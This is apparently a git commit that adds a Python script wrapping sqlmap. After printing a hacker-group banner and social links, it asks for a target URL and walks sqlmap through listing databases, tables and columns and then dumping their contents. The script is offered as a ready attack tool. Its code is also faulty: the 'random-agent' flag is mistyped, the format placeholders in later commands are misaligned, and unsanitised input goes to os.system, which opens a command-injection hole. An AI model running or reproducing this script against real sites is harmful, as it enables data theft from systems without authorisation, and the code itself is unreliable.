2ffd17e2585b46c0c1cb149e345f0212db7c0132
joker25000 <randjiaa@gmail.com>
2017-04-29 16:35:30 -0400

    Add files via upload

---
+++ sql.py
@@ -0,0 +1,29 @@
+import os
+print('''  /$$$$$$            /$$          /$$$$$$              /$$              
+ /$$__  $$          | $$         /$$__  $$            | $$              
+| $$  \__/  /$$$$$$ | $$        | $$  \ $$ /$$   /$$ /$$$$$$    /$$$$$$ 
+|  $$$$$$  /$$__  $$| $$ /$$$$$$| $$$$$$$$| $$  | $$|_  $$_/   /$$__  $$
+ \____  $$| $$  \ $$| $$|______/| $$__  $$| $$  | $$  | $$    | $$  \ $$
+ /$$  \ $$| $$  | $$| $$        | $$  | $$| $$  | $$  | $$ /$$| $$  | $$
+|  $$$$$$/|  $$$$$$$| $$        | $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$/
+ \______/  \____  $$|__/        |__/  |__/ \______/    \___/   \______/ 
+                | $$                                                    
+                | $$                                                    
+                |__/                                                    ''')
+print (''' [+]Sql-Auto : ACS auto command SQLMAP V1.0                              
+ [+]Author: Joker-Security (Anonymous-Algeria) 
+ [+]My Channel:https://www.youtube.com/c/Professionalhacker25
+ [+]Page FB:https://www.facebook.com/AnonymousPalestine.vip
+ [+]Page FB:https://www.facebook.com/kali.linux.pentesting.tutorials''')
+
+url = input('Enter url: ')
+sqlmap1 = os.system('sqlmap --url  {} --dbs  ==randon-agent'.format (url))
+dbs = input('Enter dbs: ')
+sqlmap2 = os.system('sqlmap --url  {} -D {} --tables  ==randon-agent'.format (url,dbs))
+tap1 = input('Enter tab: ')
+sqlmap3 = os.system('sqlmap --url  {} -D  -T {} --columns  ==randon-agent'.format (url,dbs,tap1))
+colm =input('Enter  colm: ')
+sqlmap4 = os.system('sqlmap --url  {} -D  -T {} -C {} --dump  ==randon-agent'.format (url,dbs,tap1,colm))
+
+
+
